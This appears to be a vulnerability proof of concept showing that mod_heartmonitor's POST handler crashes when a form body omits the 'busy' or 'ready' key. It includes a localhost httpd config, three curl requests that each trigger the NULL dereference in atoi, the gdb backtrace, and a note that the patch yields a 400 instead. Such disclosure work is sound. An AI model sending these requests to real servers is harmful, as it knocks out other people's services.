# PoC 061 - Heartbeat POST Handler atoi(NULL) Crash

`mod_heartmonitor`'s HTTP POST handler calls `atoi(apr_table_get(tbl,"busy"))`
and `atoi(apr_table_get(tbl,"ready"))` without checking that the keys exist.
A POST body that omits either key passes `NULL` to `atoi`, which crashes the
worker on most platforms.

## Setup

Same vhost as PoC 060:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule watchdog_module     modules/mod_watchdog.so
LoadModule heartmonitor_module modules/mod_heartmonitor.so
HeartbeatListen 127.0.0.1:27999
HeartbeatStorage logs/hb.dat

<Location /HeartbeatAccept>
    SetHandler heartbeat
    Require all granted
</Location>
```

Run httpd in single-process mode so the crash is obvious:

```
httpd -X -f $PWD/conf/httpd.conf
```

## Trigger

Three independent inputs that each take the unguarded path:

```
# (1) body completely missing both keys
curl -sS -X POST --data 'v=1' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    http://127.0.0.1:8080/HeartbeatAccept

# (2) busy missing, ready present
curl -sS -X POST --data 'v=1&ready=2' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    http://127.0.0.1:8080/HeartbeatAccept

# (3) busy present, ready missing
curl -sS -X POST --data 'v=1&busy=3' \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    http://127.0.0.1:8080/HeartbeatAccept
```

## Observed effect

For each of the three requests the worker process dereferences the `NULL`
pointer inside `atoi()` (libc reads `*str`). On Linux/glibc this manifests as
`SIGSEGV` at `_int_strtol_l` / `__strtol_internal`; macOS shows
`EXC_BAD_ACCESS (code=1, address=0x0)` inside `strtol_l`. Backtrace under
gdb:

```
#0  __strtol_internal (nptr=0x0, ...) at strtol.c:106
#1  atoi (nptr=0x0) at atoi.c:27
#2  hm_handler (r=...) at modules/cluster/mod_heartmonitor.c:779
```

`error_log` shows the corresponding `child pid ... exit signal Segmentation
fault (11)` line and the request returns a connection reset to the client.
With the patch applied, the same three requests produce a clean `400 Bad
Request` response and no crash.
